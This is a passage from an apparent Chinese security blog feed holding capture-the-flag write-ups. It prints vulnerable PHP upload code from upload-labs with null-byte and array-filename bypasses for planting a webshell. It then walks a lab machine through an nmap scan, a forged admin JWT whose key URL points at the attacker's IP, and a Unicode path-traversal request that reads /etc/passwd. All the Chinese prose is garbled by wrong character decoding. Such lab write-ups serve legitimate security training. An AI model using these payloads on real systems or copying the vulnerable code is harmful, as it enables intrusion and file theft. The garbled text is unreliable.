class="number">-5</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å¤±è´¥ï¼ŒæœåŠ¡å™¨å·²ç»å­˜åœ¨ç›¸åŒåç§°æ–‡ä»¶ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>; </span><br><span class="line">        <span class="keyword">case</span> <span class="number">-6</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æ–‡ä»¶æ— æ³•ä¸Šä¼ ï¼Œæ–‡ä»¶ä¸èƒ½å¤åˆ¶åˆ°ç›®æ ‡ç›®å½•ã€‚&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;      </span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;æœªçŸ¥é”™è¯¯ï¼&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//myupload.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyUpload</span></span>&#123;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$cls_arr_ext_accepted</span> = <span class="keyword">array</span>(</span><br><span class="line">      <span class="string">&quot;.doc&quot;</span>, <span class="string">&quot;.xls&quot;</span>, <span class="string">&quot;.txt&quot;</span>, <span class="string">&quot;.pdf&quot;</span>, <span class="string">&quot;.gif&quot;</span>, <span class="string">&quot;.jpg&quot;</span>, <span class="string">&quot;.zip&quot;</span>, <span class="string">&quot;.rar&quot;</span>, <span class="string">&quot;.7z&quot;</span>,<span class="string">&quot;.ppt&quot;</span>,</span><br><span class="line">      <span class="string">&quot;.html&quot;</span>, <span class="string">&quot;.xml&quot;</span>, <span class="string">&quot;.tiff&quot;</span>, <span class="string">&quot;.jpeg&quot;</span>, <span class="string">&quot;.png&quot;</span> );</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">......  </span><br><span class="line">  <span class="comment">/** upload()</span></span><br><span class="line"><span class="comment">   **</span></span><br><span class="line"><span class="comment">   ** Method to upload the file.</span></span><br><span class="line"><span class="comment">   ** This is the only method to call outside the class.</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@para</span> String name of directory we upload to</span></span><br><span class="line"><span class="comment">   ** <span class="doctag">@returns</span> void</span></span><br><span class="line"><span class="comment">  **/</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"> <span class="variable">$dir</span> </span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;isUploadedFile();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;setDir( <span class="variable">$dir</span> );</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkExtension();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkSize();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if flag to check if the file exists is set to 1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_file_exists == <span class="number">1</span> )&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;checkFileExists();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// if we are here, we are ready to move the file to destination</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// check if we need to rename the file</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( <span class="keyword">$this</span>-&gt;cls_rename_file == <span class="number">1</span> )&#123;</span><br><span class="line">      <span class="variable">$ret</span> = <span class="keyword">$this</span>-&gt;renameFile();</span><br><span class="line">      <span class="keyword">if</span>( <span class="variable">$ret</span> != <span class="number">1</span> )&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="variable">$ret</span> );    </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// if we are here, everything worked as planned :)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;resultUpload( <span class="string">&quot;SUCCESS&quot;</span> );</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">...... </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="PASS-20"><a href="#PASS-20" class="headerlink" title="PASS-20"></a>PASS-20</h2><p>ä»ä»£ç ä¸­åˆ†æï¼Œå‘ç°move_uploaded_file()å‡½æ•°ä¸­çš„img_pathæ˜¯ç”±postå‚æ•°save_nameæ§åˆ¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨save_nameåˆ©ç”¨00æˆªæ–­ç»•è¿‡ï¼Œæ¼æ´åˆ©ç”¨æˆåŠŸçš„æ¡ä»¶æ˜¯PHPçš„ç‰ˆæœ¬è¦ä½äº5.3</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;php&quot;</span>,<span class="string">&quot;php5&quot;</span>,<span class="string">&quot;php4&quot;</span>,<span class="string">&quot;php3&quot;</span>,<span class="string">&quot;php2&quot;</span>,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;htm&quot;</span>,<span class="string">&quot;phtml&quot;</span>,<span class="string">&quot;pht&quot;</span>,<span class="string">&quot;jsp&quot;</span>,<span class="string">&quot;jspa&quot;</span>,<span class="string">&quot;jspx&quot;</span>,<span class="string">&quot;jsw&quot;</span>,<span class="string">&quot;jsv&quot;</span>,<span class="string">&quot;jspf&quot;</span>,<span class="string">&quot;jtml&quot;</span>,<span class="string">&quot;asp&quot;</span>,<span class="string">&quot;aspx&quot;</span>,<span class="string">&quot;asa&quot;</span>,<span class="string">&quot;asax&quot;</span>,<span class="string">&quot;ascx&quot;</span>,<span class="string">&quot;ashx&quot;</span>,<span class="string">&quot;asmx&quot;</span>,<span class="string">&quot;cer&quot;</span>,<span class="string">&quot;swf&quot;</span>,<span class="string">&quot;htaccess&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$file_name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$file_ext</span> = pathinfo(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>,<span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123; </span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = UPLOAD_PATH . <span class="string">&#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>å½“æˆ‘ä»¬ä¸Šä¼ webshell.phpæ–‡ä»¶å¹¶é‡å‘½åä¸ºwebshell.phpæ—¶ï¼Œå®ƒæ˜¾ç¤ºä¸å…è®¸ä¿å­˜ä¸ºè¯¥æ–‡ä»¶ç±»å‹<br><img src="https://img-blog.csdnimg.cn/c6515b4d2ff34eef8a8cba8f45a3393a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/a2ec3df096a9456996dbab46c6f991e0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/71251da9ea5d416491ec42043975db2d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/b292e12804f6407c9254383d8d284420.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="PASS-21"><a href="#PASS-21" class="headerlink" title="PASS-21"></a>PASS-21</h2><p>é€šè¿‡å®¡æŸ¥æºç å‘ç°ï¼Œ<code>$file_name</code>ç»è¿‡<code>reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>å¤„ç†ï¼Œå¦‚æœä¸Šä¼ çš„æ˜¯æ•°ç»„çš„è¯ï¼Œä¼šè·³è¿‡<code>$file = explode(&#39;.&#39;, strtolower($file));</code>ï¼Œè€Œæœ€ç»ˆçš„æ–‡ä»¶ååç¼€å–çš„æ˜¯<code>$file[count($file) - 1]</code>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è®©<code>$file</code>ä¸ºæ•°ç»„ã€‚<code>$file[0]ä¸ºsmi1e.php/</code>ï¼Œä¹Ÿå°±æ˜¯<code>reset($file)</code>ï¼Œç„¶åå†ä»¤<code>$file[2]</code>ä¸ºç™½åå•ä¸­çš„jpgã€‚æ­¤æ—¶<code>end($file)</code>ç­‰äºjpgï¼Œ<code>$file[count($file) - 1]</code>ä¸ºç©ºã€‚è€Œ <code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>ï¼Œä¹Ÿå°±æ˜¯<code>smi1e.php/.</code>ï¼Œæœ€ç»ˆmove_uploaded_fileä¼šå¿½ç•¥æ‰/.ï¼Œæœ€ç»ˆä¸Šä¼ smi1e.phpã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">//æ£€æŸ¥MIME</span></span><br><span class="line">    <span class="variable">$allow_type</span> = <span class="keyword">array</span>(<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/gif&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!in_array(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>],<span class="variable">$allow_type</span>))&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="comment">//æ£€æŸ¥æ–‡ä»¶å</span></span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>]) ? <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>] : <span class="variable">$_POST</span>[<span class="string">&#x27;save_name&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (!is_array(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="variable">$file</span> = explode(<span class="string">&#x27;.&#x27;</span>, strtolower(<span class="variable">$file</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$ext</span> = end(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$allow_suffix</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$ext</span>, <span class="variable">$allow_suffix</span>)) &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$file_name</span> = reset(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[count(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br><span class="line">            <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">            <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> .<span class="variable">$file_name</span>;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;</span>;</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="string">&quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f5fd6c6a71114afdb44ece6f274b74bb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
]]></content>
      <categories>
        <category>æ–‡ä»¶ä¸Šä¼ æ¼æ´</category>
      </categories>
      <tags>
        <tag>Upload-labs</tag>
      </tags>
  </entry>
  <entry>
    <title>Unicode</title>
    <url>/2022/02/06/Unicode/</url>
    <content><![CDATA[<h2 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ports=$(nmap -p- --min-rate=1000 -T4 <span class="variable">$1</span> | grep ^[0-9] | cut -d <span class="string">&#x27;/&#x27;</span> -f 1 | tr <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span><br><span class="line">nmap -sC -sV -oN result -p<span class="variable">$ports</span> <span class="variable">$1</span></span><br></pre></td></tr></table></figure>
<p>å‘ç°ç›®æ ‡ä¸»æœºå¼€æ”¾äº†sshå’ŒwebæœåŠ¡<br><img src="https://img-blog.csdnimg.cn/94531f843e904009983662305cf416f7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å…ˆè®¿é—®ä¸€ä¸‹webæœåŠ¡ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæ³¨å†Œç™»å½•çš„é¡µé¢ï¼Œæˆ‘ä»¬å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç™»å½•çœ‹çœ‹é¡µé¢éƒ½å®ç°äº†å“ªäº›åŠŸèƒ½<br><img src="https://img-blog.csdnimg.cn/58b0c8b7d4da4868b8c55e31cf82b006.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<span id="more"></span>

<p>ç™»å½•æˆåŠŸåï¼Œå‘ç°å­˜åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ é¡µé¢ï¼Œä½†æ˜¯ç»è¿‡å¤šæ¬¡å°è¯•ï¼Œå¯ä»¥ä¸Šä¼ æˆåŠŸï¼Œå¯æ˜¯å¹¶ä¸èƒ½è·å–åˆ°ä¸Šä¼ çš„è·¯å¾„<br><img src="https://img-blog.csdnimg.cn/2d61973f094d405389ede27aedcc29ba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_19,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<!--more-->

<p>å½“æˆ‘æ‰“å¼€æŸ¥çœ‹ç½‘é¡µcookieçš„æ—¶å€™ï¼Œå‘ç°æ˜¯JWTå½¢å¼å­˜å‚¨<br><img src="https://img-blog.csdnimg.cn/2e84937520c94758b02237094c1d8d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_14,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬è§£å¯†JWTåå‘ç°å­˜åœ¨ä¸€ä¸ªurlè·¯å¾„ï¼Œæˆ‘ä»¬å°†å…¶æ·»åŠ åˆ°hostsæ–‡ä»¶åè¿›è¡Œè®¿é—®å¹¶å°†jwks.jsonå€¼ä¿å­˜ä¸‹æ¥<br><img src="https://img-blog.csdnimg.cn/66a49f96c74949d6a7124ee8f4f46431.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/1a8a683ed66c4c01ba30fbcf25dcd74e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¿™ä¸ªæ¼æ´åˆ©ç”¨è¿‡ç¨‹å°±æ¯”è¾ƒå¤æ‚äº†ï¼Œä¹Ÿæ¯”è¾ƒè€ƒéªŒæ¸—é€æµ‹è¯•è€…çš„ç»éªŒå’Œè„‘æ´ã€‚é¦–å…ˆæˆ‘ä»¬å…ˆåœ¨<a href="https://mkjwk.org/">https://mkjwk.org/</a>è¿™ä¸ªç½‘ç«™ä¸Šç”Ÿæˆä¸€ä¸ªç”¨äºåå¼¹åˆ°æœ¬æœºä¸Šçš„jsonå€¼ï¼Œæˆ‘ä»¬å°†ç”Ÿæˆçš„nå€¼å¯¹åº”çš„å€¼æ›¿æ¢æ‰åŸæ¥ä¿å­˜çš„jwks.jsonçš„å€¼</p>
<p><img src="https://img-blog.csdnimg.cn/2395e952d4c2421c90faec928391bfa5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/7b089027eba64eba8226cb130c062b6d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/5f4cf42fd9c54d4fabc001825bb29e5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åæˆ‘ä»¬åˆ©ç”¨urlé‡å®šå‘ï¼Œå…ˆåœ¨æœ¬åœ°å¼€æ”¾ä¸€ä¸ªå¾®å‹çš„æœåŠ¡å™¨ï¼Œç„¶åå°†ç”¨æˆ·å˜æ¢ä¸ºadminï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„JWTå€¼ç”¨æˆ·ç™»å½•adminç”¨æˆ·ç•Œé¢ï¼Œæœ€åå°†æ–°ç”Ÿæˆçš„å…¬é’¥ç§é’¥å€¼å¤åˆ¶åˆ°ç”Ÿæˆé¡µé¢ä¸Šã€‚<br><img src="https://img-blog.csdnimg.cn/7dd0979b020f42769ff74f57dd9f6d3b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><img src="https://img-blog.csdnimg.cn/f350f5bcd6314ccab112859ec77a8b67.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>
<p><img src="https://img-blog.csdnimg.cn/c18abc73505a467c8871475cfb0c06df.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_17,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”Ÿæˆä¸€ä¸ªæ–°çš„JWTå€¼ï¼Œæ›¿æ¢æ‰ç”¨æ™®é€šç”¨æˆ·ç™»å½•çš„JWTå€¼ï¼Œåˆ·æ–°é¡µé¢</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTQuMjMvandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4ifQ.XdbEyn8OmY2soOmA_LCwfwPyW_CgWyMD0TyeVDQZ0KlVTLHTaiuhui961b8qXqc_Kbxu20Zt6FYaZV_JS9dP_RT19ecIdFMZaEkRup-y07r1KBoHMWiGTyg-Q9uc1auj3XMqjHSp6rT7eTEsVFv-qzjQEVPaRJfqYLoE6Hxt2aW2bvG1I3PoEm9oVnH3zXm_ngM46AC_4Iy3ZMXduufwEeJY8OLkQPlZgQ0s3tuQjDZqRjFMlYBz0sGkgw_Oud-40hvrylaQmJdmsulrbED9BLiuhCvbFrX_Q-tXlxkxHWc5Q52co1qf6A0P-2N_zeRjhw0M1RB3T7G2GvTKZGFJzQ</span><br></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/f798ff356a704ad5978651ab61558088.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»current monthé¡µé¢æ˜¯ï¼Œå‘ç°æ˜¯ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå¹¶ä¸”ä¸€èˆ¬çš„è¯»å–å§¿åŠ¿è¿˜ä¸èƒ½è¯»å–æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/2a90ae4d3b0f4fabb4568a2c7e9543b3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5bmz5Yeh55qE5a2m6ICF,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æˆ‘ä»¬å°è¯•ä½¿ç”¨<code>U+FE30</code>çš„ç¼–ç å½¢å¼è¿›è¡Œç»•è¿‡ï¼Œç»è¿‡åå¤å°è¯•æˆåŠŸè¯»å–åˆ°<code>/etc/passwd</code>æ–‡ä»¶çš„å†…å®¹ï¼Œè¿™æ˜¯æœ‰å…³æ–‡ä»¶è¯»å–ç¼–ç ç»•è¿‡çš„å…·ä½“å†…å®¹<a href="https://link.zhihu.com/?target=https://lazarv.com/posts/unicode-normalization-vulnerabilities/">https://link.zhihu.com/?target=https%3A//lazarv.com/posts/unicode-normalization-vulnerabilities/</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://10.10.11.126/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd</span><br></pre></td></tr></table></figure>

